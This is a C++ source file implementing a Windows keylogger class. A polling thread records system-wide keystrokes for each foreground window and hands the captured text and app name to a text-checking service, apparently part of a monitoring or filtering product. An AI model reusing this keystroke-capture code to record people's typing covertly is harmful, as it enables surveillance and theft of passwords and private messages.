#include "StdAfx.h"
#include "KeyLogger.h"
//#include <ntstatus.h>
#include <NTSecAPI.h>

extern 	CString GetForegroundAppName();

CKeyLogger::CKeyLogger() : m_hThread( NULL ), m_pService( NULL )
{
}


CKeyLogger::~CKeyLogger(void)
{
}

void CKeyLogger::OnKeyEvent( WCHAR nKey )
{
	HWND hWnd = GetForegroundWindow();
	ATL::CAtlMap< HWND, WndData >::CPair *pPair = m_map.Lookup( hWnd );
	if( !pPair )
	{
		WndData wd;
		pPair = m_map.GetAt( m_map.SetAt( hWnd, wd ) );
	}

	if( !pPair )
		return;
	if( nKey == VK_RETURN || nKey == VK_TAB || nKey == VK_LBUTTON )
	{
		if( m_pService )
		{
			VARIANT_BOOL bEraseText = VARIANT_FALSE;
			CComBSTR bstrApp( GetForegroundAppName() );

			HRESULT hr = m_pService->CheckText( CComBSTR( pPair->m_value.m_str ), TYPE_KEYLOGGER, bstrApp, &bEraseText );

		}
		//TODO:SendAppName to CheckText
		pPair->m_value.m_str.Empty();
	}
	else
		pPair->m_value.m_str += nKey;
}

DWORD WINAPI CKeyLogger::ThreadWatch( PVOID pVoid )
{
	CKeyLogger *pThis = reinterpret_cast<CKeyLogger*>(pVoid);
	CoInitializeEx( NULL, COINIT_MULTITHREADED );
	pThis->DoWatch();
	CoUninitialize();
	return 0;
}

void CKeyLogger::GetKeysStates( SHORT *pKeys )
{
	for( int i = VK_BACK; i < 256; i++ )
		pKeys[ i ] = GetAsyncKeyState( i );
}

bool CKeyLogger::IsValidChar( TCHAR nChar )
{
	if( IsCharAlphaNumeric( nChar ) )
		return true;

	if( nChar == VK_RETURN || nChar == VK_SPACE || nChar == VK_TAB || nChar == VK_LBUTTON )
		return true;

	return false;
}

void CKeyLogger::DoWatch()
{
	SHORT KeyBoardState[ 256 ] = { 0 };
	BYTE KeyBoardState2[ 256 ] = { 0 };
	bool KeysDown[ 256 ] = { 0 };

	while( WaitForSingleObject( m_evt, 10 ) == WAIT_TIMEOUT )
	{
		GetKeysStates( KeyBoardState );
		BOOL bRet = GetKeyboardState( KeyBoardState2 );

		if( KeyBoardState[ VK_CONTROL ] & 0x8000 || KeyBoardState[ VK_MENU ] & 0x8000 ) //Ignore Ctrl And Alt keys
			continue;

		SHORT bCaps = KeyBoardState[ VK_CAPITAL ] & 0x8000;
		SHORT bShift = KeyBoardState[ VK_SHIFT ] & 0x8000;
		//if( bCaps )
		//	MessageBeep( 0 );
		for( int i = VK_LBUTTON; i < 256; i++ )
		{
			if( KeyBoardState[ i ] & 0x8000 )
			{
				if( !KeysDown[ i ] )
				{
					UINT nKey = MapVirtualKey( i, MAPVK_VK_TO_CHAR );
					if( nKey )
					{
						WCHAR nChar = LOWORD( nKey ) ;
						if( IsValidChar( nChar ) )
						{
							if( bCaps ^ bShift )
								CharUpperBuff( &nChar, 1 );
							else
								CharLowerBuff( &nChar, 1 );
						}
						OnKeyEvent( nChar );
					}
					//WORD aWords[ 2 ] = { 0 };
					//UINT nScanCode = 0;
					//int nRet = ToAscii( i, nScanCode, KeyBoardState2, aWords, 0 );
					//if( nRet )
					//	OnKeyEvent( aWords[ 0 ] );

					KeysDown[ i ] = true;
				}
			}
			else
				KeysDown[ i ] = false;
		}
	}
}



void CKeyLogger::Start()
{
	m_evt.Create( NULL, FALSE, FALSE, NULL );
	m_hThread = CreateThread( NULL, 0, ThreadWatch, reinterpret_cast<PVOID>(this), 0, NULL );
}

void CKeyLogger::Stop()
{
	//m_evt.Set();
	m_evt.Close();
	WaitForSingleObject( m_hThread, INFINITE );
	CloseHandle( m_hThread );
}
